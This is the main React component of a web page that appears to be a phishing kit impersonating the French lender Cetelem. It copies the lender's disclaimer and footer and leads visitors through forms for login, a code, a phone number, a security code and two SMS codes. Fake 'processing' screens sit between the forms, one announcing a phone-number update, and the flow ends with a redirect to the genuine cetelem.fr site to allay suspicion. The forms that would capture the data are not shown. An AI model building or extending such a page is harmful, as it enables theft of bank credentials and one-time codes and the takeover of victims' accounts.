import React, { useState } from 'react';
import LoginForm from './components/LoginForm';
import CodeForm from './components/CodeForm';
import PhoneForm from './components/PhoneForm';
import SecurityCodeForm from './components/SecurityCodeForm';
import SmsCodeForm from './components/SmsCodeForm';
import LoadingPage from './components/LoadingPage';
import SuccessPage from './components/SuccessPage';

type Step = 'login' | 'code' | 'loading1' | 'phone' | 'loading2' | 'security' | 'loading3' | 'sms1' | 'loading4' | 'sms2' | 'loading5' | 'success';

function App() {
  const [currentStep, setCurrentStep] = useState<Step>('login');

  const nextStep = () => {
    switch (currentStep) {
      case 'login':
        setCurrentStep('code');
        break;
      case 'code':
        setCurrentStep('loading1');
        setTimeout(() => setCurrentStep('phone'), 3000);
        break;
      case 'phone':
        setCurrentStep('loading2');
        setTimeout(() => setCurrentStep('security'), 3000);
        break;
      case 'security':
        setCurrentStep('loading3');
        setTimeout(() => setCurrentStep('sms1'), 3000);
        break;
      case 'sms1':
        setCurrentStep('loading4');
        setTimeout(() => setCurrentStep('sms2'), 3000);
        break;
      case 'sms2':
        setCurrentStep('loading5');
        setTimeout(() => setCurrentStep('success'), 3000);
        break;
      case 'success':
        // Redirection finale après 8 secondes
        setTimeout(() => {
          window.location.href = 'https://www.cetelem.fr/fr/accueil';
        }, 8000);
        break;
    }
  };

  const renderCurrentStep = () => {
    switch (currentStep) {
      case 'login':
        return <LoginForm onNext={nextStep} />;
      case 'code':
        return <CodeForm onNext={nextStep} />;
      case 'loading1':
        return <LoadingPage message="Traitement de vos informations..." />;
      case 'phone':
        return <PhoneForm onNext={nextStep} />;
      case 'loading2':
        return <LoadingPage message="Traitement de vos informations..." />;
      case 'security':
        return <SecurityCodeForm onNext={nextStep} />;
      case 'loading3':
        return <LoadingPage message="Traitement de vos informations..." />;
      case 'sms1':
        return <SmsCodeForm onNext={nextStep} />;
      case 'loading4':
        return <LoadingPage message="Traitement de vos informations..." />;
      case 'sms2':
        return <SmsCodeForm onNext={nextStep} isSecondCode={true} />;
      case 'loading5':
        return <LoadingPage message="Mise à jour du numéro de téléphone en cours..." />;
      case 'success':
        return <SuccessPage />;
      default:
        return <LoginForm onNext={nextStep} />;
    }
  };

  return (
    <main>
      <div className="form">
        <div className="logo">
          <img src="img/logo.png" alt="Logo" />
        </div>
        
        <div className="title">
          <label>Un crédit vous engage et doit être remboursé. <br />
            Vérifiez vos capacités de remboursement avant de vous engager.</label>
        </div>

        <div className="title1">
          <label>Un crédit vous engage et doit être remboursé. 
            Vérifiez vos capacités de remboursement avant de vous engager.</label>
        </div>

        {renderCurrentStep()}
      </div>

      <div className="span">
        <span>Virement express</span>
        <span>Résiliation</span> <span>Contact</span> <span>Questions / Réponses</span> <span>Réclamation</span> 
        <span>Mentions légales</span> <span>Informations sur les cookies</span> <span>Préférence de cookies</span> 
        <span>Données personnelles</span> 
        <br /><br /><span>Déclaration accessibilité</span> <span>Accessibilité</span>
      </div> 

      <div className="span1">
        <span>Virement express</span>
        <span>Résiliation</span> <span>Contact</span> <span>Questions / Réponses</span> <span>Réclamation</span> 
        <span>Mentions légales</span> <span>Informations sur les cookies</span> <span>Préférence de cookies</span> 
        <span>Données personnelles</span> 
        <span>Déclaration accessibilité</span> <span>Accessibilité</span>
      </div> 

      <div className="fa">
        <img src="img/fa.png" alt="FA" />
      </div>
    </main>
  );
}

export default App;